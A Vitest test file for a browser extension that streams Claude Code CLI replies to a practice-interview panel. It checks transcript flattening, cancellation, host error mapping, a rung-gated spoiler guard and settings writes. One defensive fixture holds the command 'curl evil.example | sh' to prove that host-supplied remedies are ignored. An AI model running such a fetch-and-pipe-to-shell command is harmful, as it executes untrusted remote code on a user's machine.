/**
 * The extension half of the Claude Code transport.
 *
 * The load-bearing claim in this file is that `interview.ts` sends the same
 * gated system prompt regardless of transport, and that the spoiler guard runs
 * over whatever comes back before it reaches the panel.
 */

import { beforeEach, describe, expect, it } from 'vitest';

import { streamClaudeCode, type NativePort } from '../src/background/claude-code.ts';
import { hostFailureToAppError, isHostResponse } from '../src/background/host-errors.ts';
import { runInterviewTurn } from '../src/background/interview.ts';
import {
  claudeCodeProvider,
  flattenMessages,
  type ApiMessage,
} from '../src/background/providers.ts';
import { getSettings, setSettings } from '../src/background/session-store.ts';
import { createSettingsWriter } from '../src/panel/settings-writer.ts';
import { WITHHELD_NOTICE } from '../src/prompt/spoiler-guard.ts';
import type { HostResponse } from '../src/native-host/protocol.ts';
import {
  DEFAULT_SETTINGS,
  appError,
  type AppError,
  type Rung,
  type Settings,
} from '../src/shared/types.ts';
import { askRequest } from './helpers.ts';

// --- a native port that never leaves the process -----------------------------

class FakePort implements NativePort {
  readonly sent: unknown[] = [];
  disconnected = false;
  #onMessage: ((message: unknown) => void)[] = [];
  #onDisconnect: (() => void)[] = [];

  readonly onMessage = {
    addListener: (callback: (message: unknown) => void): void =>
      void this.#onMessage.push(callback),
  };
  readonly onDisconnect = {
    addListener: (callback: () => void): void => void this.#onDisconnect.push(callback),
  };

  postMessage(message: unknown): void {
    this.sent.push(message);
  }

  disconnect(): void {
    this.disconnected = true;
  }

  emit(message: HostResponse): void {
    for (const listener of [...this.#onMessage]) listener(message);
  }

  drop(): void {
    for (const listener of [...this.#onDisconnect]) listener();
  }

  /** The `claude-start` the extension opened with. */
  get start(): { model: string; system: string; prompt: string; requestId: string } {
    return this.sent[0] as { model: string; system: string; prompt: string; requestId: string };
  }
}

/** `claude-code.ts` reads `chrome.runtime.lastError` on disconnect. */
function stubChrome(): {
  store: Record<string, unknown>;
  setLastError(message: string | null): void;
} {
  const store: Record<string, unknown> = {};
  const runtime: { lastError?: { message: string } } = {};
  (globalThis as { chrome?: unknown }).chrome = {
    runtime,
    storage: {
      local: {
        get: (key: string) => Promise.resolve(key in store ? { [key]: store[key] } : {}),
        set: (values: Record<string, unknown>) => {
          Object.assign(store, values);
          return Promise.resolve();
        },
      },
    },
  };
  return {
    store,
    setLastError: (message) => {
      if (message === null) delete runtime.lastError;
      else runtime.lastError = { message };
    },
  };
}

let chromeStub: ReturnType<typeof stubChrome>;
beforeEach(() => {
  chromeStub = stubChrome();
});

function stream(port: FakePort, overrides: Record<string, unknown> = {}): Promise<void> {
  return streamClaudeCode({
    model: 'claude-sonnet-5',
    system: 'SYSTEM',
    prompt: 'PROMPT',
    onText: () => undefined,
    connect: () => port,
    requestId: 'req-1',
    ...overrides,
  });
}

const failure = (promise: Promise<unknown>): Promise<AppError | null> =>
  promise.then(
    () => null,
    (error: AppError) => error,
  );

describe('flattening a transcript', () => {
  const messages: ApiMessage[] = [
    { role: 'user', content: 'first question' },
    { role: 'assistant', content: 'first reply' },
    { role: 'user', content: '# SESSION\nUnlocked rung: 2' },
  ];

  it('leaves a single turn exactly as it is', () => {
    expect(flattenMessages([{ role: 'user', content: 'just this' }])).toBe('just this');
  });

  it('keeps every earlier turn, labelled by who said it, with the live turn last', () => {
    const flat = flattenMessages(messages);
    expect(flat).toContain('first question');
    expect(flat).toContain('first reply');
    expect(flat.indexOf('first question')).toBeLessThan(flat.indexOf('first reply'));
    expect(flat.endsWith('# SESSION\nUnlocked rung: 2')).toBe(true);
    expect(flat).toContain('The candidate said');
    expect(flat).toContain('You replied');
  });

  it('is empty for an empty conversation rather than throwing', () => {
    expect(flattenMessages([])).toBe('');
  });
});

describe('the streaming port', () => {
  it('opens with the model, the system prompt and the flattened transcript', async () => {
    const port = new FakePort();
    const running = stream(port);
    expect(port.start).toMatchObject({
      kind: 'claude-start',
      requestId: 'req-1',
      model: 'claude-sonnet-5',
      system: 'SYSTEM',
      prompt: 'PROMPT',
    });
    port.emit({ ok: true, kind: 'claude-done', requestId: 'req-1' });
    await expect(running).resolves.toBeUndefined();
    expect(port.disconnected).toBe(true);
  });

  /*
   * Every pulse has to get through. The panel's stall detector decides whether
   * to tell the user something is wrong purely from the gap between events, so
   * de-duplicating heartbeats here - which an earlier version did - would freeze
   * it on the first one and make a healthy long think look like a hang.
   */
  it('surfaces deltas in order and forwards every thinking heartbeat', async () => {
    const port = new FakePort();
    const chunks: string[] = [];
    let started = 0;
    let thinking = 0;
    const running = stream(port, {
      onText: (text: string) => chunks.push(text),
      onStarted: () => (started += 1),
      onThinking: () => (thinking += 1),
    });

    port.emit({ ok: true, kind: 'claude-started', requestId: 'req-1' });
    port.emit({ ok: true, kind: 'claude-thinking', requestId: 'req-1' });
    port.emit({ ok: true, kind: 'claude-thinking', requestId: 'req-1' });
    port.emit({ ok: true, kind: 'claude-thinking', requestId: 'req-1' });
    port.emit({ ok: true, kind: 'claude-delta', requestId: 'req-1', text: 'one ' });
    port.emit({ ok: true, kind: 'claude-delta', requestId: 'req-1', text: 'two' });
    port.emit({ ok: true, kind: 'claude-done', requestId: 'req-1' });
    await running;

    expect(chunks.join('')).toBe('one two');
    expect(started).toBe(1);
    expect(thinking).toBe(3);
  });

  it('drops liveness frames belonging to another request', async () => {
    const port = new FakePort();
    let started = 0;
    let thinking = 0;
    const running = stream(port, {
      onStarted: () => (started += 1),
      onThinking: () => (thinking += 1),
    });

    port.emit({ ok: true, kind: 'claude-started', requestId: 'someone-else' });
    port.emit({ ok: true, kind: 'claude-thinking', requestId: 'someone-else' });
    port.emit({ ok: true, kind: 'claude-done', requestId: 'req-1' });
    await running;

    expect(started).toBe(0);
    expect(thinking).toBe(0);
  });

  it('ignores frames belonging to another request', async () => {
    const port = new FakePort();
    const chunks: string[] = [];
    const running = stream(port, { onText: (text: string) => chunks.push(text) });
    port.emit({ ok: true, kind: 'claude-delta', requestId: 'someone-else', text: 'not mine' });
    port.emit({ ok: true, kind: 'claude-delta', requestId: 'req-1', text: 'mine' });
    port.emit({ ok: true, kind: 'claude-done', requestId: 'req-1' });
    await running;
    expect(chunks.join('')).toBe('mine');
  });

  it("rejects with the host's own message and remedy", async () => {
    const port = new FakePort();
    const running = stream(port);
    port.emit({
      ok: false,
      code: 'claude-logged-out',
      message: 'The Claude Code CLI is not logged in.',
      command: 'claude auth login',
      requestId: 'req-1',
    });

    const error = await failure(running);
    expect(error).toMatchObject({
      code: 'claude-logged-out',
      message: 'The Claude Code CLI is not logged in.',
      remedies: [{ command: 'claude auth login' }],
    });
    expect(port.disconnected).toBe(true);
  });

  it('does not sit on a spinner when the helper dies mid-stream', async () => {
    const port = new FakePort();
    const running = stream(port);
    port.emit({ ok: true, kind: 'claude-delta', requestId: 'req-1', text: 'half a sen' });
    port.drop();
    expect(await failure(running)).toMatchObject({ code: 'claude-cli-failed' });
  });

  it('blames the missing helper when Chrome says why the port closed', async () => {
    const port = new FakePort();
    chromeStub.setLastError('Specified native messaging host not found.');
    const running = stream(port);
    port.drop();
    const error = await failure(running);
    expect(error).toMatchObject({ code: 'native-host-missing' });
    expect(error?.remedies[0]?.command).toBe('./bin/install-native-host.sh');
  });

  describe('cancelling', () => {
    it('tells the host to kill the child, then drops the port', async () => {
      const port = new FakePort();
      const controller = new AbortController();
      const running = stream(port, { signal: controller.signal });

      controller.abort();
      expect(await failure(running)).toMatchObject({ code: 'aborted' });
      expect(port.sent[1]).toEqual({ kind: 'claude-cancel', requestId: 'req-1' });
      expect(port.disconnected).toBe(true);
    });

    it('never starts a run that was cancelled before it began', async () => {
      const port = new FakePort();
      const controller = new AbortController();
      controller.abort();
      expect(await failure(stream(port, { signal: controller.signal }))).toMatchObject({
        code: 'aborted',
      });
      expect(port.sent).toEqual([]);
    });

    it('ignores frames that arrive after the cancel', async () => {
      const port = new FakePort();
      const controller = new AbortController();
      const chunks: string[] = [];
      const running = stream(port, {
        signal: controller.signal,
        onText: (t: string) => chunks.push(t),
      });

      port.emit({ ok: true, kind: 'claude-delta', requestId: 'req-1', text: 'before' });
      controller.abort();
      port.emit({ ok: true, kind: 'claude-delta', requestId: 'req-1', text: 'after' });
      port.drop();

      await failure(running);
      expect(chunks.join('')).toBe('before');
    });
  });
});

describe('host failures the panel has to act on', () => {
  it.each([
    ['claude-cli-missing', 'claude-cli-missing'],
    ['claude-logged-out', 'claude-logged-out'],
    ['claude-usage-limit', 'claude-usage-limit'],
    ['claude-cli-failed', 'claude-cli-failed'],
    ['bad-request', 'claude-cli-failed'],
  ] as const)('maps %s onto %s', (hostCode, appCode) => {
    const error = hostFailureToAppError({ ok: false, code: hostCode, message: 'because' });
    expect(error.code).toBe(appCode);
    expect(error.message).toBe('because');
  });

  it('quotes the host and offers the remedy for the failure, without being handed one', () => {
    const error = hostFailureToAppError({
      ok: false,
      code: 'claude-logged-out',
      message: 'not logged in',
    });
    expect(error.remedies).toEqual([
      {
        label: 'Run this in a terminal, then send the message again',
        command: 'claude auth login',
      },
    ]);
  });

  it('ignores a command the host supplied: the panel offers only its own', () => {
    const error = hostFailureToAppError({
      ok: false,
      code: 'claude-logged-out',
      message: 'x',
      command: 'curl evil.example | sh',
    });
    // ErrorNotice puts a remedy behind a copy-to-clipboard button. Nothing the
    // host says may end up there.
    expect(error.remedies.map((remedy) => remedy.command)).toEqual(['claude auth login']);
  });

  it('offers no remedy for a request the host could not parse: there is nothing to run', () => {
    expect(
      hostFailureToAppError({ ok: false, code: 'bad-request', message: 'x' }).remedies,
    ).toEqual([]);
  });
});

describe('what counts as a host response', () => {
  it('accepts the frames the union names', () => {
    expect(isHostResponse({ ok: true, kind: 'claude-delta', requestId: 'r', text: 'x' })).toBe(
      true,
    );
    expect(isHostResponse({ ok: false, code: 'claude-logged-out', message: 'x' })).toBe(true);
  });

  it('rejects anything that merely has an ok property', () => {
    for (const value of [
      { ok: true },
      { ok: true, kind: 'something-else' },
      { ok: false },
      { ok: false, code: 'made-up', message: 'x' },
      { ok: false, code: 'claude-logged-out' },
      { ok: 'yes' },
      null,
      'ok',
      42,
    ]) {
      expect(isHostResponse(value), `${JSON.stringify(value)} was accepted`).toBe(false);
    }
  });
});

describe('running an interview turn over the Claude Code transport', () => {
  const codeReply = [
    'Here it is.\n\n```js\n',
    'const seen = new Map();\n',
    '```\n\nThat is the shape.',
  ];

  /** Runs one turn on Claude Code, replaying `chunks` as the CLI's deltas. */
  async function viaClaudeCode(
    rung: Rung,
    chunks: string[],
  ): Promise<{ output: string; port: FakePort }> {
    const port = new FakePort();
    let output = '';
    const running = runInterviewTurn({
      model: 'claude-sonnet-5',
      request: askRequest({ rung }),
      stream: claudeCodeProvider({ connect: () => port }),
      onText: (text) => {
        output += text;
      },
    });
    // The port is opened synchronously inside the provider.
    await Promise.resolve();
    for (const text of chunks)
      port.emit({ ok: true, kind: 'claude-delta', requestId: port.start.requestId, text });
    port.emit({ ok: true, kind: 'claude-done', requestId: port.start.requestId });
    await running;
    return { output, port };
  }

  it('sends the rung-gated system prompt to the CLI, not a Claude Code one', async () => {
    const { port } = await viaClaudeCode(1, ['ok']);
    expect(port.start.system).toContain('You are at rung 1 - Pattern smell');
    expect(port.start.system).toContain('Rung 2 (Name the technique) is LOCKED');
    expect(port.start.prompt).toContain('# SESSION');
    expect(port.start.prompt).toContain('Unlocked rung: 1');
  });

  it.each([0, 1, 2, 3] satisfies Rung[])(
    'runs the spoiler guard over a rung %i reply',
    async (rung) => {
      const { output } = await viaClaudeCode(rung, codeReply);
      expect(output).not.toContain('new Map()');
      expect(output).not.toContain('```');
      expect(output).toContain(WITHHELD_NOTICE.trim());
      expect(output).toContain('Here it is.');
      expect(output).toContain('That is the shape.');
    },
  );

  it.each([4, 5] satisfies Rung[])('lets code through at rung %i', async (rung) => {
    const { output } = await viaClaudeCode(rung, codeReply);
    expect(output).toContain('const seen = new Map();');
  });
});

describe('the model setting', () => {
  it('defaults to Sonnet 5', async () => {
    expect(DEFAULT_SETTINGS.model).toBe('claude-sonnet-5');
    await expect(getSettings()).resolves.toEqual(DEFAULT_SETTINGS);
  });

  it('round-trips a switch to another model', async () => {
    await expect(setSettings({ model: 'claude-opus-5' })).resolves.toEqual({
      model: 'claude-opus-5',
    });
    await expect(getSettings()).resolves.toEqual({ model: 'claude-opus-5' });
  });

  it('refuses a model it does not know', async () => {
    const stored = { model: 'gpt-9' } as unknown as Parameters<typeof setSettings>[0];
    await expect(setSettings(stored)).resolves.toEqual(DEFAULT_SETTINGS);
  });
});

describe('saving a settings change', () => {
  /**
   * A worker stand-in that answers writes only when told to, and in whatever
   * order it is told to - the two ways this used to go wrong.
   */
  function fakeWorker() {
    const pending: { settings: Settings; resolve(): void; reject(error: AppError): void }[] = [];
    const shown: Settings[] = [];
    const errors: AppError[] = [];
    /** What the worker's storage holds, written in the order writes arrive. */
    let stored: Settings = { ...DEFAULT_SETTINGS };

    const writer = createSettingsWriter({
      save: (settings) =>
        new Promise<Settings>((resolvePromise, rejectPromise) => {
          pending.push({
            settings,
            resolve: () => {
              stored = settings;
              resolvePromise(settings);
            },
            reject: rejectPromise,
          });
        }),
      onSettings: (settings) => shown.push(settings),
      onError: (error) => errors.push(error),
    });

    return {
      writer,
      pending,
      shown,
      errors,
      get stored(): Settings {
        return stored;
      },
      get displayed(): Settings | undefined {
        return shown.at(-1);
      },
      /** Let the microtask queue - and therefore the write chain - run on. */
      settle: () => new Promise<void>((r) => setTimeout(r, 0)),
    };
  }

  it('keeps the latest choice when the model is switched twice back to back', async () => {
    const worker = fakeWorker();
    worker.writer.adopt({ model: 'claude-sonnet-5' });

    // Faster than a round trip: the second handler used to read the state as it
    // was before the first, and write a whole object that undid it.
    worker.writer.patch({ model: 'claude-opus-5' });
    worker.writer.patch({ model: 'claude-haiku-4-5-20251001' });

    expect(worker.displayed).toEqual({ model: 'claude-haiku-4-5-20251001' });

    await worker.settle();
    worker.pending[0]?.resolve();
    await worker.settle();
    worker.pending[1]?.resolve();
    await worker.settle();

    expect(worker.stored).toEqual({ model: 'claude-haiku-4-5-20251001' });
    expect(worker.displayed).toEqual({ model: 'claude-haiku-4-5-20251001' });
  });

  it('serialises writes, so the worker sees them in the order they were made', async () => {
    const worker = fakeWorker();
    worker.writer.adopt({ model: 'claude-sonnet-5' });

    worker.writer.patch({ model: 'claude-opus-5' });
    worker.writer.patch({ model: 'claude-haiku-4-5-20251001' });
    await worker.settle();

    // The second write is not even issued until the first has answered, so the
    // worker cannot apply them out of order.
    expect(worker.pending).toHaveLength(1);
    expect(worker.pending[0]?.settings).toEqual({ model: 'claude-opus-5' });

    worker.pending[0]?.resolve();
    await worker.settle();

    expect(worker.pending).toHaveLength(2);
    expect(worker.pending[1]?.settings).toEqual({ model: 'claude-haiku-4-5-20251001' });
  });

  it('ignores a reply that a later change has already superseded', async () => {
    const worker = fakeWorker();
    worker.writer.adopt({ model: 'claude-sonnet-5' });

    worker.writer.patch({ model: 'claude-opus-5' });
    await worker.settle();
    worker.writer.patch({ model: 'claude-sonnet-5' });

    // The first write answers after the user has already changed their mind.
    worker.pending[0]?.resolve();
    await worker.settle();

    expect(worker.displayed?.model).toBe('claude-sonnet-5');
  });

  it('undoes the optimistic value when the write fails, and says why', async () => {
    const worker = fakeWorker();
    worker.writer.adopt({ model: 'claude-sonnet-5' });

    worker.writer.patch({ model: 'claude-opus-5' });
    expect(worker.displayed?.model).toBe('claude-opus-5');

    await worker.settle();
    worker.pending[0]?.reject(appError('api-error', 'storage is full'));
    await worker.settle();

    expect(worker.displayed).toEqual({ model: 'claude-sonnet-5' });
    expect(worker.errors).toHaveLength(1);
    expect(worker.errors[0]?.message).toBe('storage is full');
  });

  it('lets a change made before the stored value arrived stand, and still confirms it', async () => {
    const worker = fakeWorker();

    // The panel asks for settings on mount and the sheet is one click away, so
    // the user can change something before the load answers.
    worker.writer.patch({ model: 'claude-opus-5' });
    expect(worker.displayed?.model).toBe('claude-opus-5');

    worker.writer.adopt({ model: 'claude-sonnet-5' });

    // The load must not revert what the user just chose.
    expect(worker.displayed?.model).toBe('claude-opus-5');

    await worker.settle();
    worker.pending[0]?.resolve();
    await worker.settle();

    // Nor may it orphan the write: the reply is still applied, so the panel and
    // storage agree without waiting for a reload.
    expect(worker.displayed?.model).toBe('claude-opus-5');
    expect(worker.stored.model).toBe('claude-opus-5');
    expect(worker.writer.current.model).toBe('claude-opus-5');
  });

  it('takes the stored value when the load arrives with nothing in flight', async () => {
    const worker = fakeWorker();
    worker.writer.adopt({ model: 'claude-opus-5' });
    expect(worker.displayed).toEqual({ model: 'claude-opus-5' });
  });

  it('rolls a later failure back to the stored value, not to the defaults', async () => {
    const worker = fakeWorker();

    // Adopt after a write is already in flight, so it only updates the
    // baseline. That baseline is what a failure must fall back to.
    worker.writer.patch({ model: 'claude-opus-5' });
    worker.writer.adopt({ model: 'claude-haiku-4-5-20251001' });
    await worker.settle();
    worker.pending[0]?.resolve();
    await worker.settle();

    worker.writer.patch({ model: 'claude-sonnet-5' });
    await worker.settle();
    worker.pending[1]?.reject(appError('api-error', 'storage is full'));
    await worker.settle();

    expect(worker.displayed).toEqual({ model: 'claude-opus-5' });
    expect(worker.errors).toHaveLength(1);
  });

  it('does not undo anything when a newer change is already on its way', async () => {
    const worker = fakeWorker();
    worker.writer.adopt({ model: 'claude-sonnet-5' });

    worker.writer.patch({ model: 'claude-opus-5' });
    await worker.settle();
    worker.writer.patch({ model: 'claude-haiku-4-5-20251001' });

    worker.pending[0]?.reject(appError('api-error', 'transient'));
    await worker.settle();

    // The newer intent stands; only the failure is reported.
    expect(worker.displayed).toEqual({ model: 'claude-haiku-4-5-20251001' });
    expect(worker.errors).toHaveLength(1);
  });
});
